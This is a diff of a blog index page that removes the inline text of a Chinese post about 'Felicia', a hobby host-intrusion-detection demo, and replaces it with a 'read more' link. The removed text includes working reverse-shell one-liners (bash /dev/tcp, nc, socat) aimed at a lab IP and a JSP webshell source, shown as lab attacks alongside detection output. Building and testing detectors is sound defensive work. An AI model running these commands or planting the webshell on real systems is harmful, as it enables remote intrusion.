@@ -282,7 +282,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-12-18 00:11:07" itemprop="dateModified" datetime="2020-12-18T00:11:07+08:00">2020-12-18</time>
+        <time title="修改时间：2020-12-18 00:12:30" itemprop="dateModified" datetime="2020-12-18T00:12:30+08:00">2020-12-18</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -310,69 +310,14 @@
 <p>3、也可以算作入主机安全领域这段时间下来的一个小沉淀、小总结</p>
 <p>4、虽然非常简单，但包含着自己对主机安全这块的理解与思考，可以作为自己能力的一部分</p>
 <p>虽然事情很多，但最终还是决定去写这个项目，项目取名”Felicia”，源自小时候很喜欢的一款单机RPG游戏中的女二的名字（翻译过来应该是叫”菲利西亚”），从小喜欢到现在的女角色；给自己第一个项目取这个名字还是带着一点想法的，寓意是激励自己，希望对一切都能保持单纯与热情（就像对这个游戏一样），并在开源这条道路上坚定的走下去。</p>
-<h1 id="二、设计"><a href="#二、设计" class="headerlink" title="二、设计"></a>二、设计</h1><h2 id="1、架构设计"><a href="#1、架构设计" class="headerlink" title="1、架构设计"></a>1、架构设计</h2><p>yulong的架构可以称作是当前业界hids方向的标准架构设计了，当时的设想就是在这套标准架构的基础上筛除一些可有可无的，比如web和与其相关的功能（毕竟只是自己玩），只留下agent、daemon、server、es、kafka/mq这些基础设施；agent用来实时/定时收集信息和做安全检测以及传输事件，daemon负责与agent进行通信，server只保留数据接收/分析功能，es负责全量数据的持久化与搜索，kafka/mq负责做消息队列存储安全事件，方便分发事件给其它（将要设计的）模块，如（大数据）分析模型等等</p>
-<p><img src="/Users/xdw/Documents/xdwBlog.ink/source/_posts/Felicia-Hids-Demo-Design/image-20201217224942568.png" alt="image-20201217224942568"></p>
-<h2 id="2、功能设计"><a href="#2、功能设计" class="headerlink" title="2、功能设计"></a>2、功能设计</h2><p>功能上初步设计如下几个模块：</p>
-<p>1）进程监控</p>
-<ul>
-<li>反弹shell</li>
-<li>web命令执行</li>
-<li>异常命令执行</li>
-</ul>
-<p>2）网络监控</p>
-<ul>
-<li>异常外联（威胁情报中心）</li>
-</ul>
-<p>3）文件监控</p>
-<ul>
-<li>异常文件变动</li>
-</ul>
-<h2 id="3、具体实现"><a href="#3、具体实现" class="headerlink" title="3、具体实现"></a>3、具体实现</h2><p>1）监控功能</p>
-<ul>
-<li>进程（cn_proc）</li>
-<li>网络（netlink socket监视）</li>
-<li>文件（inotify/fanotify）</li>
-</ul>
-<p>2）检测功能</p>
-<ul>
-<li>虽业界通用，但较为敏感，不再赘述</li>
-</ul>
-<h2 id="4、演示"><a href="#4、演示" class="headerlink" title="4、演示"></a>4、演示</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><strong>受害机</strong>：</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp;/dev/tcp/<span class="number">192.168</span><span class="number">.31</span><span class="number">.162</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>or</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc <span class="number">192.168</span><span class="number">.31</span><span class="number">.162</span> <span class="number">7777</span> <span class="number">0</span>&lt;backpipe | bash <span class="number">1</span>&gt;backpipe <span class="number">2</span>&gt;backpipe</span><br></pre></td></tr></table></figure>
-
-<p>or</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4:<span class="number">192.168</span><span class="number">.30</span><span class="number">.127</span>:<span class="number">1234</span> EXEC:bash,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
-
-<p><strong>攻击机：</strong></p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk <span class="number">7777</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>检测结果：</strong></p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:<span class="symbol">~/Felicia# ./demo</span></span><br><span class="line"><span class="symbol">reverse shell event</span></span><br><span class="line"><span class="symbol">&#123;</span></span><br><span class="line"><span class="symbol">  'evt'</span>:'rvshell'</span><br><span class="line">  'pid':'<span class="number">1925</span>6'</span><br><span class="line">  'exe':'/bin/bash'</span><br><span class="line">  'cmdline':'bash'</span><br><span class="line">  'cwd':'/root/Felicia'</span><br><span class="line">  'ppid':'<span class="number">1925</span>5'</span><br><span class="line">  'pexe':'/usr/bin/socat'</span><br><span class="line">  'pcmdline':'socat TCP4:192.168.31.162:<span class="number">7777</span> EXEC:bash,pty,stderr,setsid,sigint,sane'</span><br><span class="line">  'uid':'0'</span><br><span class="line">  'pname':'bash'</span><br><span class="line">  'stdin':'/dev/pts/3'</span><br><span class="line">  'stdout':'/dev/pts/3'</span><br><span class="line">  'srcip':'192.168.31.115'</span><br><span class="line">  'dstip':'192.168.31.162'</span><br><span class="line">  'srcport':'<span class="number">4369</span>6'</span><br><span class="line">  'dstport':'<span class="number">7777</span>'</span><br><span class="line">  'tty':'/dev/pts/3'</span><br><span class="line">  'unixtime':'0'</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">root@ubuntu:<span class="symbol">~/Felicia# ./demo</span></span><br><span class="line"><span class="symbol">reverse shell event</span></span><br><span class="line"><span class="symbol">&#123;</span></span><br><span class="line"><span class="symbol">  'evt'</span>:'rvshell'</span><br><span class="line">  'pid':'<span class="number">1923</span>0'</span><br><span class="line">  'exe':'/bin/bash'</span><br><span class="line">  'cmdline':'bash'</span><br><span class="line">  'cwd':'/root/Felicia'</span><br><span class="line">  'ppid':'<span class="number">1461</span>5'</span><br><span class="line">  'pexe':'/bin/bash'</span><br><span class="line">  'pcmdline':'-bash'</span><br><span class="line">  'uid':'0'</span><br><span class="line">  'pname':'bash'</span><br><span class="line">  'stdin':'pipe:[<span class="number">140445</span>]'</span><br><span class="line">  'stdout':'/root/Felicia/backpipe'</span><br><span class="line">  'srcip':'192.168.31.115'</span><br><span class="line">  'dstip':'192.168.31.162'</span><br><span class="line">  'srcport':'<span class="number">4369</span>4'</span><br><span class="line">  'dstport':'<span class="number">7777</span>'</span><br><span class="line">  'tty':'/dev/pts/4'</span><br><span class="line">  'unixtime':'0'</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">root@ubuntu:<span class="symbol">~/Felicia# ./demo</span></span><br><span class="line"><span class="symbol">reverse shell event</span></span><br><span class="line"><span class="symbol">&#123;</span></span><br><span class="line"><span class="symbol">  'evt'</span>:'rvshell'</span><br><span class="line">  'pid':'<span class="number">1870</span>5'</span><br><span class="line">  'exe':'/bin/bash'</span><br><span class="line">  'cmdline':'bash -i'</span><br><span class="line">  'cwd':'/root/Felicia'</span><br><span class="line">  'ppid':'<span class="number">1461</span>5'</span><br><span class="line">  'pexe':'/bin/bash'</span><br><span class="line">  'pcmdline':'-bash'</span><br><span class="line">  'uid':'0'</span><br><span class="line">  'pname':'bash'</span><br><span class="line">  'stdin':'socket:[<span class="number">136198</span>]'</span><br><span class="line">  'stdout':'socket:[<span class="number">136198</span>]'</span><br><span class="line">  'srcip':'192.168.31.115'</span><br><span class="line">  'dstip':'192.168.31.162'</span><br><span class="line">  'srcport':'<span class="number">4365</span>8'</span><br><span class="line">  'dstport':'<span class="number">7777</span>'</span><br><span class="line">  'tty':'/dev/pts/4'</span><br><span class="line">  'unixtime':'0'</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Web-RCE"><a href="#Web-RCE" class="headerlink" title="Web RCE"></a>Web RCE</h3><p>vulnhub tomcat8靶场测试 jsp小马执行命令</p>
-<p><strong>受害机：</strong></p>
-<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@06bc32a5536b</span><span class="symbol">:/usr/local/tomcat/webapps/ROOT</span><span class="comment"># cat getshell.jsp</span></span><br><span class="line">&lt;%</span><br><span class="line">    if(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream <span class="keyword">in</span> = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        int a = <span class="number">-1</span>;</span><br><span class="line">        byte[] b = new byte[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=<span class="number">-1</span>)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>攻击机：</strong></p>
-<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="string">//192.168.31.115</span><span class="function">:8007</span>/getshell.jsp?<span class="keyword">pwd</span>=023&amp;i=<span class="keyword">ls</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>检测结果：</strong></p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:<span class="symbol">~/Felicia# ./demo</span></span><br><span class="line"><span class="symbol">web rce event</span></span><br><span class="line"><span class="symbol">&#123;</span></span><br><span class="line"><span class="symbol">  'evt'</span>:'webrce'</span><br><span class="line">  'pid':'<span class="number">1948</span>4'</span><br><span class="line">  'exe':'/bin/ls'</span><br><span class="line">  'cmdline':'ls'</span><br><span class="line">  'cwd':'/usr/local/tomcat'</span><br><span class="line">  'ppid':'<span class="number">1559</span>4'</span><br><span class="line">  'pexe':'/usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java'</span><br><span class="line">  'pcmdline':'/usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava./proc/<span class="number">1948</span>4/exe'</span><br><span class="line">  'uid':'0'</span><br><span class="line">  'pname':'ls'</span><br><span class="line">  'stdin':'pipe:[<span class="number">141299</span>]'</span><br><span class="line">  'stdout':'pipe:[<span class="number">141300</span>]'</span><br><span class="line">  'tty':' '</span><br><span class="line">  'unixtime':'0'</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="三、问题"><a href="#三、问题" class="headerlink" title="三、问题"></a>三、问题</h1><p>最终的成品依旧是未完工的，只有进程监控和反弹shell、命令执行两块的检测，没有文件、网络监控，没有server；之所以未完成， 主要包含以下几点：</p>
-<p>1、时间太紧，人力有限，没有更多时间和精力投入了</p>
-<p>2、和工作内容有重合，相对有一点敏感</p>
-<p>3、整体项目无论是设计还是功能，都非常简单，其实要只说思考和理解的话，在设计阶段目的就已经达到了；剩下的就是代码化，去在细节层面去发现问题，提升能力了，这块还是打算慢慢积累，现在花时间去做这个其实意义不是非常大</p>
-<p>4、工作中有新的挑战，云（原生）安全将是未来的风口，花时间去学习新东西（eBPF、Sysdig、Falco、Cilium、etc.）相比设计和落地已经理解的东西意义更大</p>
-<h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p><a href="https://github.com/driverxdw/Felicia（dalao勿喷" target="_blank" rel="noopener">https://github.com/driverxdw/Felicia（dalao勿喷</a> 也希望能与同一领域的师傅们多交流）</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/12/14/Felicia-Hids-Demo-Design/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
